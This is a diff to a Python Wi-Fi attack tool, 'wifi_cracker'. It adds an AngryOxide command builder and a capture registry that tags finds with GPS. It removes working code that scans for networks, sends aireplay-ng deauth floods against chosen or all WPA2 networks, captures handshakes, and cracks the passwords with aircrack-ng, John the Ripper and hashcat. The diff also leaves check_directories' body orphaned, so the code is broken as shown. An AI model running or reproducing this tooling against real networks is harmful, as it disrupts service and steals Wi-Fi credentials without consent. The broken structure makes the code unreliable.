@@ -1004,7 +1004,144 @@ class wifi_cracker:
             "Timestamp": timestamp
         }
 
-    def check_directories(self):
+    def build_angryoxide_cmd(self, interface, output_dir="collection",
+                              targets=None, whitelist=None,
+                              channel=None, band=None,
+                              gpsd_host=None, gpsd_port=None,
+                              rate=2, autohunt=False, headless=True,
+                              disable_deauth=False, disable_pmkid=False,
+                              notransmit=False, notar=True):
+        """
+        Builds the angryoxide command list for subprocess launch.
+        Returns (cmd, output_prefix) where output_prefix is the -o argument
+        passed to AngryOxide so the dashboard knows where to find output files.
+
+        AngryOxide drops: <output>.hc22000, <output>.cap, <output>.kismet.db
+        The dashboard's file-watcher monitors collection/ for new .hc22000 and
+        .cap files and auto-registers them via register_new_captures().
+
+        Key flags:
+          --notar   - don't wrap outputs in a tarball (easier to watch files)
+          --headless - no TUI, stdout-only (required for dashboard log streaming)
+          --gpsd    - point at the OVERWATCH host gpsd (10.0.0.2:2947)
+        """
+        if gpsd_host is None:
+            gpsd_host = getattr(self, 'gps_network_host', '10.0.0.2')
+        if gpsd_port is None:
+            gpsd_port = getattr(self, 'gps_network_port', 2947)
+
+        # Build a timestamped output prefix so each run's files are distinct
+        ts = time.strftime("%Y-%m-%d_%H-%M-%S")
+        output_prefix = os.path.join(output_dir, f"ao_{ts}")
+
+        cmd = ['angryoxide', '-i', interface, '-o', output_prefix]
+
+        if headless:
+            cmd.append('--headless')
+        if notar:
+            cmd.append('--notar')
+        if autohunt:
+            cmd.append('--autohunt')
+        if notransmit:
+            cmd.append('--notransmit')
+        if disable_deauth:
+            cmd.append('--disable-deauth')
+        if disable_pmkid:
+            cmd.append('--disable-pmkid')
+
+        cmd.extend(['--gpsd', f"{gpsd_host}:{gpsd_port}"])
+        cmd.extend(['--rate', str(rate)])
+
+        if channel:
+            cmd.extend(['-c', str(channel)])
+        elif band:
+            cmd.extend(['-b', str(band)])
+
+        if targets:
+            for t in (targets if isinstance(targets, list) else [targets]):
+                cmd.extend(['-t', t])
+
+        if whitelist:
+            for w in (whitelist if isinstance(whitelist, list) else [whitelist]):
+                cmd.extend(['-w', w])
+
+        return cmd, output_prefix
+
+    def register_new_captures(self, collection_dir="collection"):
+        """
+        Scans collection/ for .cap and .hc22000 files not yet in the captures
+        table and registers them. Called by the dashboard's /api/captures/scan
+        endpoint (auto-triggered after an AngryOxide run completes, or manually
+        via a "Refresh Inventory" button).
+
+        AngryOxide filename format: <output_prefix>.hc22000 / <output_prefix>.cap
+        These don't follow MiFi's ESSID--BSSID--CHANNEL--TS.cap convention, so
+        we parse GPS and network metadata from the .kismet.db if present, or fall
+        back to filename-only metadata.
+
+        Returns count of newly registered captures.
+        """
+        conn = sqlite3.connect(self.db_file)
+        c = conn.cursor()
+        c.execute("SELECT cap_filename FROM captures WHERE cap_filename IS NOT NULL")
+        already_tracked = {row[0] for row in c.fetchall()}
+
+        registered = 0
+        cap_re = re.compile(
+            r'^(?P<essid>.+)--(?P<bssid>[0-9A-Fa-f:]{17})--(?P<channel>\d+)--'
+            r'(?P<date>\d{4}-\d{2}-\d{2})_(?P<time>\d{2}-\d{2}-\d{2})-\d+\.(cap|hc22000)$'
+        )
+
+        if not os.path.isdir(collection_dir):
+            conn.close()
+            return 0
+
+        for fname in sorted(os.listdir(collection_dir)):
+            if fname in already_tracked:
+                continue
+            if not (fname.endswith('.cap') or fname.endswith('.hc22000')):
+                continue
+
+            handshake_type = 'PMKID' if fname.endswith('.hc22000') else 'EAPOL'
+
+            # Try MiFi-format filename parsing
+            m = cap_re.match(fname)
+            if m:
+                essid = m.group('essid').replace('_', ' ')
+                bssid = m.group('bssid')
+                channel = m.group('channel')
+                captured_at = f"{m.group('date')} {m.group('time').replace('-', ':')}"
+            else:
+                # AngryOxide output: ao_TIMESTAMP.hc22000 or similar
+                # Minimal registration — BSSID/channel filled in later via /api/captures/scan
+                essid = os.path.splitext(fname)[0]
+                bssid = ''
+                channel = ''
+                captured_at = time.strftime("%Y-%m-%d %H:%M:%S",
+                                            time.localtime(os.path.getmtime(
+                                                os.path.join(collection_dir, fname))))
+
+            gps_lat = gps_lon = gps_alt = None
+            if self.latest_gps_position:
+                gps_lat = self.latest_gps_position.get('latitude')
+                gps_lon = self.latest_gps_position.get('longitude')
+                gps_alt = self.latest_gps_position.get('altitude')
+
+            c.execute('''
+                INSERT INTO captures
+                    (essid, bssid, channel, handshake_type, cap_filename,
+                     captured_at, gps_lat, gps_lon, gps_alt)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ''', (essid, bssid, channel, handshake_type, fname,
+                  captured_at, gps_lat, gps_lon, gps_alt))
+            registered += 1
+            self.log(f"Registered new capture: {fname}", prefix="plus", indent=4)
+
+        conn.commit()
+        conn.close()
+        return registered
+
+
         """
         Checks for the existence of required directories and the SQLite 
         database. Creates them if they do not exist.
@@ -1038,695 +1175,6 @@ class wifi_cracker:
             self.init_database()
 
         conn.close()
-
-    def scan_networks(self, timeout=None):
-        """
-        Performs a passive scan for nearby networks and populates self.networks and self.wpa2_targets.
-        Accepts a timeout parameter to control scan duration.
-        """
-        if not self.target_essid:
-            self.log("Scanning for networks...", prefix="moved", indent=4)
-        scan_timeout = timeout if timeout is not None else self.initial_scan
-
-        try:
-            if os.path.exists("dump-01.csv"):
-                self.clean()
-
-            cmd = f"sudo timeout {scan_timeout}s airodump-ng -w dump --output-format csv --berlin 3 {self.interface}"
-            # Use Popen with polling to allow KeyboardInterrupt during execution
-            # Important: Set stdin=DEVNULL to prevent airodump-ng from waiting for input
-            try:
-                proc = subprocess.Popen(
-                    cmd,
-                    shell=True,
-                    stdin=subprocess.DEVNULL,  # Prevent waiting for input
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL,
-                    preexec_fn=os.setsid
-                )
-                # Poll the process periodically to allow KeyboardInterrupt to be caught
-                while proc.poll() is None:
-                    time.sleep(0.1)  # Small sleep to allow interrupt
-                if proc.returncode != 0 and proc.returncode != 124:  # 124 is timeout exit code
-                    raise subprocess.CalledProcessError(proc.returncode, cmd)
-            except KeyboardInterrupt:
-                # Kill the subprocess if interrupted
-                try:
-                    os.killpg(proc.pid, signal.SIGTERM)
-                    proc.wait(timeout=2)
-                except (subprocess.TimeoutExpired, ProcessLookupError):
-                    try:
-                        proc.kill()
-                        proc.wait(timeout=1)
-                    except:
-                        pass
-                raise  # Re-raise KeyboardInterrupt
-        except KeyboardInterrupt:
-            # Re-raise KeyboardInterrupt to stop the main program
-            raise
-        except subprocess.CalledProcessError as e:
-            if e.returncode == 124:
-                self.log("Airodump-ng timed out as expected.", indent=4, prefix="check")
-            else:
-                self.log(f"Airodump-ng failed with error code {e.returncode}", indent=4, prefix="error")
-                return False
-
-        self.networks = {}
-        self.wpa2_targets = {}
-
-        try:
-            with open("dump-01.csv", "r", encoding="utf-8", errors="ignore") as file:
-                lines = file.readlines()
-        except FileNotFoundError:
-            self.log("dump-01.csv not found after scan.", prefix="error")
-            return False
-
-        for line in lines:
-            line = line.strip()
-            if line.startswith("BSSID"):
-                continue
-            elif line.startswith("Station MAC"):
-                break
-            elif line.count(",") > 10:
-                fields = line.split(",")
-                if len(fields) >= 14:
-                    bssid = fields[0].strip()
-                    power = fields[8].strip()
-                    channel = fields[3].strip()
-                    privacy = fields[5].strip()
-                    auth = fields[6].strip()
-                    cipher = fields[7].strip()
-                    essid = fields[13].strip()
-
-                    if essid:
-                        net_data = {
-                            "BSSID": bssid,
-                            "Channel": channel,
-                            "Power": power,
-                            "Privacy": privacy,
-                            "Authentication": auth,
-                            "Cipher": cipher
-                        }
-
-                        self.networks[essid] = net_data
-                        self.update_database(essid, net_data)
-
-                        is_wpa2 = (
-                            "WPA2" in privacy.upper() or
-                            "WPA2" in auth.upper() or
-                            "WPA2" in cipher.upper()
-                        )
-                        is_open = "OPN" in privacy.upper() or "OPEN" in privacy.upper()
-                        is_wep = "WEP" in privacy.upper()
-                        is_wpa3 = "WPA3" in privacy.upper() or "SAE" in auth.upper()
-
-                        if is_wpa2 and not is_wep and not is_open and not is_wpa3:
-                            self.wpa2_targets[essid] = net_data
-
-        return True
-
-    def display_networks(self):
-        self.table_data = []
-        for essid, data in self.networks.items():
-            self.table_data.append([
-                essid,
-                data['BSSID'],
-                data['Channel'],
-                data['Power'],
-                data['Privacy'],
-                data['Authentication'],
-                data['Cipher']
-            ])
-
-        headers = ["ESSID", "BSSID", "Channel", "Power", "Encryption", "Auth", "Cipher"]
-        self.log("Detected Networks:", prefix="blank")
-        table_str = tabulate(self.table_data, headers=headers, tablefmt="fancy_grid")
-        self.log(table_str, prefix="blank", tabulated=True)
-
-    def collect(self, mode=None, target_essid=None, target_scan_attempts=None, capture_attempts=None, packets=None, target_scan=None, initial_scan=None):
-        if self.interface is None:
-            self.configure_interface()
-
-        if target_essid:
-            self.collect_targeted(target_essid, target_scan_attempts, capture_attempts, packets, target_scan, initial_scan)
-        elif mode == "auto":
-            self.collect_auto_mode(packets, target_scan, initial_scan)
-        else:
-            self.collect_manual_mode(initial_scan, target_scan, packets)
-
-    def collect_manual_mode(self, initial_scan=None, target_scan=None, packets=None):
-        """
-        Manual mode: allows repeated manual selection of ESSIDs 
-        until the user chooses to quit.
-        """
-        # Initial scan
-        if not self.scan_networks(timeout=initial_scan):
-            self.log("Scan failed. Exiting manual mode.", prefix="error")
-            return False
-
-        while True:
-            #sys.stdout.flush()
-            self.display_networks()
-
-            while True:
-                target = input("Enter the Network ESSID ('rs' to rescan,'q' to quit): ").strip()
-
-                if target.lower() in ['q', 'quit']:
-                    self.log("Exiting manual mode...", prefix="exited")
-                    self.clean()
-                    return False
-                if target.lower() in ['rs', 'rescan']:
-                    if not self.scan_networks(timeout=initial_scan):
-                        self.log("Scan failed. Exiting manual mode.", prefix="error")
-                        return False
-                    break  # Break inner loop to redisplay networks
-                if not target:  # Empty input
-                    self.log("No ESSID entered. Please enter a valid ESSID or command.", prefix="error")
-                    continue
-                if target in self.networks:
-                    self.capture_handshake(target, target_scan=target_scan, packets=packets)
-                    self.log("Rescanning in 2 seconds...", prefix="dot", indent=4)
-                    time.sleep(2)
-                    if not self.scan_networks(timeout=initial_scan):
-                        self.log("Rescan failed.", prefix="error")
-                        return False
-                    break  # Break inner loop to redisplay networks after capture
-                else:
-                    self.log("Invalid ESSID selected. Please try again.", prefix="error")
-                    continue
-
-    def collect_auto_mode(self, packets=None, target_scan=None, initial_scan=None):
-        """
-        Automatic mode: tries to capture handshakes from all WPA2 networks.
-        """
-        if not self.scan_networks(timeout=initial_scan):
-            self.log("Scan failed in auto mode.", prefix="error")
-            return False
-        
-        self.display_networks()
-
-        if not self.wpa2_targets:
-            self.log("No WPA2 networks found.", prefix="error")
-            return False
-        
-        self.log("Running in Automatic Mode (WPA2 targets only)...", prefix="config")
-        self.log(f"Deauth packets: {packets}", indent=4, prefix="dot")
-        self.log(f"Deauth timeout: {target_scan}", indent=4, prefix="dot")
-
-        for network in self.wpa2_targets:
-            channel = self.networks[network]['Channel']
-            self.log(f"Targeting WPA2 network: {network} on channel {channel}", prefix='moved')
-            self.capture_handshake(network, auto=True, target_scan=target_scan, packets=packets)
-
-        self.log("Automatic collection complete.", prefix="exited")
-        return True
-
-    def collect_targeted(self, target_essid, target_scan_attempts, capture_attempts, packets=None, target_scan=None, initial_scan=None):
-        target = target_essid
-        max_scan_attempts = target_scan_attempts
-        max_capture_attempts = capture_attempts
-        unlimited_scan = (max_scan_attempts == 0)
-        unlimited_capture = (max_capture_attempts == 0)
-
-        if unlimited_scan:
-            self.log("Unlimited scan attempts enabled. Press Ctrl+C to stop.", prefix="error")
-        
-        scan_attempt = 0
-        try:
-            while True:
-                scan_attempt += 1
-                if unlimited_scan:
-                    self.log(f"[Scan Attempt {scan_attempt} (unlimited)] Scanning for {target}...", prefix="moved")
-                else:
-                    if scan_attempt > max_scan_attempts:
-                        break
-                    self.log(f"[Scan Attempt {scan_attempt}/{max_scan_attempts}] Scanning for {target}...", prefix="moved")
-
-                try:
-                    if not self.scan_networks(timeout=initial_scan):
-                        self.log("Scan failed.", indent=8, prefix="error")
-                        continue
-                except KeyboardInterrupt:
-                    # Re-raise to be caught by outer handler
-                    raise
-
-                if target in self.networks:
-                    self.log(f"Found target ESSID '{target}' on scan attempt {scan_attempt}.", indent=4, prefix="check")
-                    break
-                else:
-                    self.log(f"Target ESSID '{target}' not found. Retrying...", indent=4, prefix="error")
-        except KeyboardInterrupt:
-            self.log("Scan interrupted by user (Ctrl+C)", prefix="exited")
-            raise  # Re-raise to stop the main program
-
-        if not unlimited_scan and scan_attempt > max_scan_attempts:
-            self.log(f"Target ESSID '{target}' not found after {max_scan_attempts} scan attempts.", prefix="x")
-            return False
-
-        if unlimited_capture:
-            self.log("Unlimited capture attempts enabled. Will continue until EAPOL detected or Ctrl+C.", prefix="config")
-
-        cap_attempt = 0
-        try:
-            while True:
-                cap_attempt += 1
-                if unlimited_capture:
-                    self.log(f"[Capture Attempt {cap_attempt} (unlimited)]", prefix="moved")
-                else:
-                    if cap_attempt > max_capture_attempts:
-                        break
-                    self.log(f"[Capture Attempt {cap_attempt}/{max_capture_attempts}]", prefix="moved")
-                
-                self.capture_handshake(target, auto=True, target_scan=target_scan, packets=packets)
-
-                if self.handshake_captured:
-                    self.log(f"Handshake capture for '{target}' successful after {cap_attempt} attempts.", indent=8, prefix="check")
-                    return True
-                else:
-                    self.log(f"No handshake detected on attempt {cap_attempt}. Retrying...", indent=4, prefix="exited")
-        except KeyboardInterrupt:
-            self.log("Capture interrupted by user (Ctrl+C)", prefix="exited")
-            raise  # Re-raise to stop the main program
-
-        if not unlimited_capture and cap_attempt > max_capture_attempts:
-            self.log(f"Failed to capture handshake for '{target}' after {max_capture_attempts} attempts.", prefix="x")
-            return False
-        
-        return False
-
-    def capture_handshake(self, network, auto=False, target_scan=None, packets=None):
-        """
-        Attempts to capture a WPA2 handshake from the specified network 
-        using airodump-ng and aireplay-ng. Checks if the capture file 
-        contains an EAPOL handshake and moves it to 'collection' if 
-        successful.
-        """
-        if network not in self.networks:
-            self.log(f"Network {network} not found in scan results.", prefix="error")
-            return
-        self.log(f"Conducting deauth attack...", indent=4, prefix="dot")
-        
-        #essid = network.replace(" ", "_")
-        essid = re.sub(r'[^\w\-_.]', '_', network)
-        bssid = self.networks[network]['BSSID']
-        channel = self.networks[network]['Channel']
-        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
-        filename = f"{essid}--{bssid}--{channel}--{timestamp}"
-        cap_file = f"{filename}-01.cap"
-
-        # Explicitly set interface to target channel before starting capture/deauth
-        # This ensures the interface is on the correct channel for both airodump-ng and aireplay-ng
-        if self.verbose:
-            self.log(f"Setting interface {self.interface} to channel {channel}...", indent=4, prefix="config")
-        try:
-            self.coms(['iw', 'dev', self.interface, 'set', 'channel', channel], 
-                     capture_output=True, check=True, suppress_stderr=True)
-            if self.verbose:
-                self.log(f"Interface set to channel {channel}", indent=8, prefix="check")
-        except subprocess.CalledProcessError as e:
-            if self.verbose:
-                self.log(f"Warning: Failed to set channel via 'iw', airodump-ng will attempt to set it", 
-                        indent=8, prefix="error")
-                self.log(f"Error details: {e}", indent=12, prefix="dash")
-
-        # Run a monitor thread on the target network
-        airodump_cmd = ["airodump-ng", "-w", filename, "-c", channel, "--bssid", bssid, self.interface]
-        # Send deauth packets targeting that specific network
-
-        deauth_cmd = ["aireplay-ng", "-0", str(packets if packets is not None else self.packets), "-a", bssid, self.interface]
-
-        airodump_proc = self.coms(
-            airodump_cmd,
-            background=True,
-            preexec_fn=os.setpgrp
-        )
-
-        # Give airodump-ng a few seconds to initialize and ensure channel is set
-        time.sleep(3)
-
-        deauth_proc = self.coms(
-            deauth_cmd,
-            background=True,
-            preexec_fn=os.setpgrp
-        )
-
-        # Let both run for the specified target scan time
-        scan_time = target_scan if target_scan is not None else 60
-        try:
-            time.sleep(scan_time)
-        except KeyboardInterrupt:
-            # If interrupted, clean up processes and re-raise
-            self.log("Capture interrupted. Cleaning up processes...", prefix="exited")
-            for proc in (deauth_proc, airodump_proc):
-                try:
-                    proc.send_signal(signal.SIGTERM)
-                    proc.wait(timeout=2)
-                except (subprocess.TimeoutExpired, ProcessLookupError):
-                    try:
-                        proc.kill()
-                        proc.wait(timeout=1)
-                    except:
-                        pass
-            raise  # Re-raise KeyboardInterrupt to stop the main program
-
-        # Terminate processes gracefully
-        for proc in (deauth_proc, airodump_proc):
-            try:
-                proc.send_signal(signal.SIGINT)  # Send Ctrl-C
-                proc.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                proc.kill()
-                proc.wait()
-
-        if os.path.exists(cap_file):
-            if self.verbose:
-                self.log(f"Capture file {cap_file} found.", indent=4, prefix="dot")
-            eapol_check = self.has_eapol(cap_file)
-            if eapol_check:
-                self.handshake_captured = True
-                self.log("EAPOL handshake detected.", prefix="check", indent=4)
-                if not os.path.exists("collection"):
-                    self.log("ERROR: 'collection' directory not found.", prefix="x", indent=4)
-                    self.log("Please run './start.sh' to create required directories.", indent=8, prefix="error")
-                    sys.exit(1)
-                os.rename(cap_file, os.path.join("collection", os.path.basename(cap_file)))
-                self.log("Capture moved to /collection", prefix="moved", indent=4)
-                power = self.networks.get(network, {}).get('Power')
-                privacy = self.networks.get(network, {}).get('Privacy')
-                self.register_capture(
-                    essid=network, bssid=bssid, channel=channel,
-                    cap_filename=cap_file, power=power, privacy=privacy
-                )
-            else:
-                self.handshake_captured = False
-                self.log("No EAPOL handshake found. Cleaning up.", prefix="x", indent=4)
-        else:
-            self.log("No capture file created.", prefix="error", indent=4)
-        
-        self.clean()
-    
-    def clean(self):
-        self.coms("rm -rf *.csv")
-        self.coms("rm -rf *.cap")
-        self.coms("rm -rf *.netxml")
-
-    def has_eapol(self, cap_file):
-        """
-        Uses wpapcap2john to check if the .cap file contains a valid 
-        EAPOL handshake by searching for the $WPAPSK$ pattern.
-        """
-        try:
-            result = self.coms(["wpapcap2john", cap_file], capture_output=True)
-            return "$WPAPSK$" in result.stdout
-        except Exception as e:
-            self.log(f"Error in has_eapol: {e}", prefix="error")
-            return False
-
-    def _resolve_capture_id(self, bssid, cap_filename=None):
-        """
-        Look up the captures.id for a given BSSID (and optionally exact
-        cap_filename, since a BSSID could theoretically have multiple
-        non-deleted captures). Returns None if no match -- callers should
-        treat that as "this .cap predates the captures table" and skip
-        processing_runs tracking for it gracefully rather than failing.
-        """
-        conn = sqlite3.connect(self.db_file)
-        c = conn.cursor()
-        if cap_filename:
-            c.execute(
-                "SELECT id FROM captures WHERE bssid = ? AND cap_filename = ? AND cap_deleted = 0",
-                (bssid, os.path.basename(cap_filename))
-            )
-        else:
-            c.execute(
-                "SELECT id FROM captures WHERE bssid = ? AND cap_deleted = 0 ORDER BY id DESC LIMIT 1",
-                (bssid,)
-            )
-        row = c.fetchone()
-        conn.close()
-        return row[0] if row else None
-
-    def crack_aircrack(self, cap_path, bssid, word_list, capture_id=None):
-        """
-        Runs aircrack-ng on the .cap file using a wordlist. Parses output
-        for "KEY FOUND!" to detect a successful crack and extract the
-        password, logging the attempt either way.
-        """
-        run_id = None
-        if capture_id:
-            run_id = self.start_processing_run(capture_id, tool="aircrack-ng",
-                                                attack_profile="wordlist", wordlist=word_list)
-
-        self.log(f"Running {word_list} aircrack-ng on {cap_path}...", prefix="plus", indent=4)
-        result = self.coms([
-            "aircrack-ng", "-w", word_list,
-            "-b", bssid, cap_path
-        ], capture_output=True, screenshot=True)
-
-        output = (result.stdout or "") if result else ""
-        match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", output)
-
-        if match:
-            password = match.group(1)
-            self.log(f"KEY FOUND: {password}", prefix="check", indent=8)
-            if run_id:
-                self.complete_processing_run(run_id, status="cracked",
-                                              password=password, capture_id=capture_id)
-            return password
-        else:
-            self.log("Wordlist exhausted, no key found.", prefix="x", indent=8)
-            if run_id:
-                self.complete_processing_run(run_id, status="exhausted", capture_id=capture_id)
-            return None
-
-    def crack_jtr(self, cap_path, capture_id=None):
-        """
-        Converts the .cap to .john format via wpapcap2john, then runs
-        John the Ripper against it (incremental mode, matching jtr.py's
-        approach), parsing --show output for the cracked password.
-        Intermediate .john files are written to a temp dir and removed
-        after the attempt -- they're disposable, not part of the
-        consolidated record (see directory-slimming discussion).
-        """
-        in_file = os.path.splitext(os.path.basename(cap_path))[0]
-        run_id = None
-        if capture_id:
-            run_id = self.start_processing_run(capture_id, tool="john",
-                                                attack_profile="incremental")
-
-        tmp_dir = tempfile.mkdtemp(prefix="mifi_jtr_")
-        john_file = os.path.join(tmp_dir, f"{in_file}.john")
-        try:
-            self.log("Running JTR .john conversion...", prefix="plus", indent=4)
-            with open(john_file, "w") as outfile:
-                self.coms(["wpapcap2john", cap_path],
-                          redirect_output=outfile, check=True, suppress_stderr=True)
-
-            if os.path.getsize(john_file) == 0:
-                self.log("wpapcap2john produced no output (no extractable hash).", prefix="x", indent=8)
-                if run_id:
-                    self.complete_processing_run(run_id, status="failed", capture_id=capture_id)
-                return None
-
-            with open(john_file, "r") as f:
-                content = f.read()
-            jtr_format = "wpapsk-pmk" if "$WPAPSK-PMK$" in content else "wpapsk"
-
-            self.log(f"Running John the Ripper (format={jtr_format})...", prefix="plus", indent=4)
-            self.coms(["john", f"--format={jtr_format}", "--incremental", john_file],
-                      capture_output=True)
-
-            show_result = self.coms(["john", "--show", f"--format={jtr_format}", john_file],
-                                     capture_output=True)
-            show_output = (show_result.stdout or "") if show_result else ""
-            # john --show output format: bssid:password:::essid::
-            match = re.search(r":([^:]+):::", show_output)
-
-            if match:
-                password = match.group(1)
-                self.log(f"KEY FOUND: {password}", prefix="check", indent=8)
-                if run_id:
-                    self.complete_processing_run(run_id, status="cracked",
-                                                  password=password, capture_id=capture_id)
-                return password
-            else:
-                self.log("John the Ripper: no key found.", prefix="x", indent=8)
-                if run_id:
-                    self.complete_processing_run(run_id, status="exhausted", capture_id=capture_id)
-                return None
-        finally:
-            shutil.rmtree(tmp_dir, ignore_errors=True)
-
-    def crack_hcx(self, cap_path, word_list, capture_id=None):
-        """
-        Converts the .cap to hashcat's .22000 format via hcxpcapngtool,
-        then runs a wordlist attack (mode 22000, attack -a 0), parsing
-        the potfile for the cracked password. Intermediate .22000/potfile
-        are written to a temp dir and removed after the attempt.
-        """
-        in_file = os.path.splitext(os.path.basename(cap_path))[0]
-        run_id = None
-        if capture_id:
-            run_id = self.start_processing_run(capture_id, tool="hashcat",
-                                                attack_profile="wordlist", wordlist=word_list)
-
-        tmp_dir = tempfile.mkdtemp(prefix="mifi_hc_")
-        hc_file = os.path.join(tmp_dir, f"{in_file}.22000")
-        pot_file = os.path.join(tmp_dir, "hashcat.potfile")
-        try:
-            self.log("Running HCX .22000 conversion...", prefix="plus", indent=4)
-            self.coms(["hcxpcapngtool", "-o", hc_file, cap_path], capture_output=True)
-
-            if not os.path.exists(hc_file) or os.path.getsize(hc_file) == 0:
-                self.log("hcxpcapngtool produced no output (no extractable hash).", prefix="x", indent=8)
-                if run_id:
-                    self.complete_processing_run(run_id, status="failed", capture_id=capture_id)
-                return None
-
-            self.log(f"Running hashcat wordlist attack ({word_list})...", prefix="plus", indent=4)
-            self.coms(["hashcat", "-m", "22000", "-a", "0", hc_file, word_list,
-                       "--potfile-path", pot_file, "--quiet"], capture_output=True)
-
-            password = None
-            if os.path.exists(pot_file):
-                with open(pot_file, "r") as f:
-                    for line in f:
-                        if ":" in line:
-                            password = line.strip().rsplit(":", 1)[-1]
-                            break
-
-            if password:
-                self.log(f"KEY FOUND: {password}", prefix="check", indent=8)
-                if run_id:
-                    self.complete_processing_run(run_id, status="cracked",
-                                                  password=password, capture_id=capture_id)
-                return password
-            else:
-                self.log("Hashcat: no key found.", prefix="x", indent=8)
-                if run_id:
-                    self.complete_processing_run(run_id, status="exhausted", capture_id=capture_id)
-                return None
-        finally:
-            shutil.rmtree(tmp_dir, ignore_errors=True)
-
-    def process_all(self, mode, word_list=None):
-        """
-        Processes captured .cap files against one or more cracking tools
-        (aircrack-ng, John the Ripper, hashcat). Each attempt is logged in
-        processing_runs; a successful crack writes to crack_results and
-        deletes the .cap (see complete_processing_run()/delete_capture_file()).
-        Uncracked captures are left in collection/ for a future attempt with
-        a different tool/wordlist, per the "keep until cracked" policy.
-
-        - Auto mode: batch processes all .cap files with aircrack-ng only.
-        - Manual mode: prompts user to select a file and a tool.
-        """
-        def run_aircrack(cap_path, in_file, target, capture_id=None):
-            bssid = self.networks.get(target, {}).get("BSSID", "")
-            self.crack_aircrack(cap_path, bssid, word_list, capture_id=capture_id)
-
-        def run_jtr(cap_path, in_file, capture_id=None):
-            self.crack_jtr(cap_path, capture_id=capture_id)
-
-        def run_hcx(cap_path, in_file, capture_id=None):
-            self.crack_hcx(cap_path, word_list, capture_id=capture_id)
-
-        cap_files = glob.glob("collection/*.cap")
-        if not cap_files:
-            self.log("No .cap files found in /collection", prefix="error")
-            return
-
-        if mode == "auto":
-            for cap_path in cap_files:
-                in_file = os.path.splitext(os.path.basename(cap_path))[0]
-                try:
-                    info = self.parse_capture_filename(in_file.replace("-01", "") + ".cap")
-                    essid = info["ESSID"]
-                    self.networks[essid] = {
-                        "BSSID": info["BSSID"],
-                        "Channel": info["Channel"],
-                        "Power": "N/A",
-                        "Privacy": "N/A",
-                        "Authentication": "N/A",
-                        "Cipher": "N/A"
-                    }
-                    target = essid
-                except Exception as e:
-                    self.log(f"Failed to parse {cap_path}: {e}", prefix="error")
-                    continue
-
-                self.log(f"Processing {cap_path}",prefix="moved")
-                capture_id = self._resolve_capture_id(info["BSSID"], cap_path)
-                run_jtr(cap_path, in_file, capture_id=capture_id)
-                run_hcx(cap_path, in_file, capture_id=capture_id)
-                run_aircrack(cap_path, in_file, target, capture_id=capture_id)
-
-        elif mode == "manual":
-            while True:
-                cap_files = glob.glob("collection/*.cap")
-                if not cap_files:
-                    self.log("No .cap files found in /collection", prefix="error")
-                    break
-
-                self.log("Available .cap files:",prefix="blank")
-                for idx, f in enumerate(cap_files, 1):
-                    self.log(f"{idx}. {f}", indent=4, prefix="dot")
-
-                choice = input("Enter the full path of the file to process (or 'q' to quit): ").strip()
-                if choice.lower() == "q":
-                    break
-                if not os.path.isfile(choice):
-                    self.log("Filename invalid. Try again.", prefix="error")
-                    continue
-
-                in_file = os.path.splitext(os.path.basename(choice))[0]
-                try:
-                    info = self.parse_capture_filename(in_file.replace("-01", "") + ".cap")
-                    essid = info["ESSID"]
-                    self.networks[essid] = {
-                        "BSSID": info["BSSID"],
-                        "Channel": info["Channel"],
-                        "Power": "N/A",
-                        "Privacy": "N/A",
-                        "Authentication": "N/A",
-                        "Cipher": "N/A"
-                    }
-                    target = essid
-                except Exception as e:
-                    self.log(f"Failed to parse {choice}: {e}", prefix="error")
-                    continue
-
-                self.log("Select processing option:", prefix="moved")
-                self.log("1. Aircrack-ng with wordlist (WPA2 only)", indent=4, prefix="dot")
-                self.log("2. JTR (.john)", indent=4, prefix="dot")
-                self.log("3. Hashcat (.22000)", indent=4, prefix="dot")
-                self.log("4. All of the above", indent=4, prefix="dot")
-                method = input("Enter option number: ").strip()
-                self.log(f"Processing {choice}", prefix="moved")
-                capture_id = self._resolve_capture_id(info["BSSID"], choice)
-                if method == "1":
-                    run_aircrack(choice, in_file, target, capture_id=capture_id)
-                elif method == "2":
-                    run_jtr(choice, in_file, capture_id=capture_id)
-                elif method == "3":
-                    run_hcx(choice, in_file, capture_id=capture_id)
-                elif method == "4":
-                    run_jtr(choice, in_file, capture_id=capture_id)
-                    run_hcx(choice, in_file, capture_id=capture_id)
-                    run_aircrack(choice, in_file, target, capture_id=capture_id)
-                else:
-                    self.log("Invalid option.", prefix="error")
-                    continue
-                # No archive step -- a successful crack auto-deletes the .cap
-                # (complete_processing_run -> delete_capture_file). Otherwise
-                # it stays in collection/ for a future attempt with another tool.
-        else:
-            self.log("Invalid process mode.", prefix="error")
-
-        self.log(f"Processing complete.",prefix="exited")
-
-    # NOTE (overwatch branch): direct-serial GPS init removed. GPS is provided
-    # exclusively via gpsd over the network (10.0.0.2:2947) — see start_gps_polling().
 
     def check_gpsd_running(self, gps_host=None, gps_port=None):
         """
@@ -3679,7 +3127,7 @@ if __name__ == "__main__":
     )
     options_group.add_argument(
         "--mode",
-        choices=["config", "collect-manual", "collect-auto", "process-manual", "process-auto", "full-manual", "full-auto", "target", "map", "dashboard", "analyze", "clean"],
+        choices=["config", "dashboard", "analyze", "clean"],
         required=False,
         help="Specific tool mode for refined behavior and use-case. If omitted, starts interactive CLI server."
     )
@@ -3700,48 +3148,6 @@ if __name__ == "__main__":
     )
 
     # Shared Variables (used by multiple distinct modes)
-    shared_group = parser.add_argument_group('Shared Variables')
-    shared_group.add_argument(
-        "-IS", "--initial-scan",
-        metavar="<INITIAL_SCAN_TIME>",
-        type=int,
-        default=30,
-        required=False,
-        help="Initial spectrum sweep time in seconds (s). Used by collect and target modes. (Default is 30)"
-    )
-    shared_group.add_argument(
-        "-TS", "--target-scan",
-        metavar="<TARGET_SCAN_TIME>",
-        type=int,
-        default=60,
-        required=False,
-        help="Target handshake monitoring time in seconds (s). Used by collect and target modes. (Default is 60)"
-    )
-    shared_group.add_argument(
-        "-p", "--packets",
-        metavar="<DEAUTH_PACKETS>",
-        type=int,
-        default=100,
-        required=False,
-        help="Deauth Packet count sent during handshake monitoring. Used by collect and target modes. (Default is 100)"
-    )
-
-    # Collect Mode Options
-    collect_group = parser.add_argument_group('Collect Mode Options')
-    collect_group.description = "No unique CLI arguments - currently uses all shared variables"
-    # Process Mode Options
-    process_group = parser.add_argument_group('Process Mode Options')
-    process_group.add_argument(
-        "-WL", "--word-list",
-        metavar="<WORD_LIST>",
-        type=str,
